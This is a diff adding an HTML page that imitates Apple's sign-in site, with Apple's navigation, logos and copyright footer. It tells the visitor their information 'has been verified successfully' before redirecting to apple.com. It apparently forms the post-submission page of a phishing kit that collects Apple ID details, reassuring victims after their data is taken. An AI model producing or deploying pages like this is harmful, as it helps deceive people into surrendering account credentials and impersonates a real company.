@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Apple</title>
+    <meta http-equiv="" content="5; https://www.apple.com">
+    <link rel="shortcut icon" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/24Mar2023/images/favicon.ico"
+        type="image/X-icon">
+    <style>
+        @font-face {
+            font-family: 'sf';
+            src: url(/assets/font/SF-Pro-Text-Light.otf);
+        }
+
+        @font-face {
+            font-family: 'sf-light';
+            src: url(/assets/font/SF-Pro-Text-Ultralight.otf);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: content-box;
+        }
+
+        body {
+            font-family: 'sf';
+            font-weight: 300;
+        }
+
+        header {
+            font-family: 'sf-light';
+        }
+
+        .search-icon {
+            background-size: 15px 88px;
+            background-repeat: no-repeat;
+            background-image: url(https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_search_image__cbllq1gkias2_large.svg);
+            background-position: center center;
+            width: 15px;
+        }
+    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="h-lvh flex flex-col justify-between">
+    <header class="bg-black opacity-80 h-[44px] overflow-hidden flex items-center px-[22px]">
+        <nav class="flex items-center justify-between text-[#f5f5f7] text-xs w-full hidden md:block">
+            <ul class="flex justify-between items-center w-full font-normal">
+                <li>
+                    <a href="https://www.apple.com">
+                        <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg"
+                            alt="">
+                    </a>
+                </li>
+                <li><a href="#" class="font-normal">Store</a></li>
+                <li><a href="#">Mac</a></li>
+                <li><a href="#">iPad</a></li>
+                <li><a href="#">iPhone</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">AirPods</a></li>
+                <li><a href="#"></a>TV & Home</li>
+                <li><a href="#">Only on Apple</a></li>
+                <li><a href="#">Accessories</a></li>
+                <li><a href="#">Support</a></li>
+                <li>
+                    <img src="/assets/img/search-icon.png" width="24" height="24" alt="">
+                </li>
+                <li>
+                    <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_bag_image__yzte50i47ciu_large.svg"
+                        alt="">
+                </li>
+            </ul>
+        </nav>
+        <nav class="flex items-center justify-between text-[#f5f5f7] text-xs w-full md:hidden">
+            <ul class="flex justify-between items-center w-full font-normal">
+                <li>
+                    <a href="https://www.apple.com">
+                        <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg"
+                            alt="">
+                    </a>
+                </li>
+                <li>
+                    <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_bag_image__yzte50i47ciu_large.svg"
+                        alt="">
+                </li>
+            </ul>
+        </nav>
+    </header>
+    <main class="h-min flex justify-center items-center w-full">
+        <p class="text-center font-semibold">Your information has been verified successfully, you will be redirected to the homepage shortly...</p>
+    </main>
+    <footer class="bg-[#f5f5f7] text-xs px-6 flex flex-col items-start py-5 text-[#6e6e73]">
+        <div class="flex flex-col md:flex-row mx-2 lg:mx-32 justify-between">
+            <div class="flex flex-col md:flex-row gap-6">
+                <p class="text-left">Copyright © 2024 Apple Inc. All rights reserved.</p>
+                <div>
+                    <a class="border-r border-[#6e6e73] pr-2" href="#">Privacy Policy</a>
+                    <a href="#">Terms of Use</a>
+                </div>
+            </div>
+            <p>United States</p>
+        </div>
+    </footer>
+</body>
+
+</html>
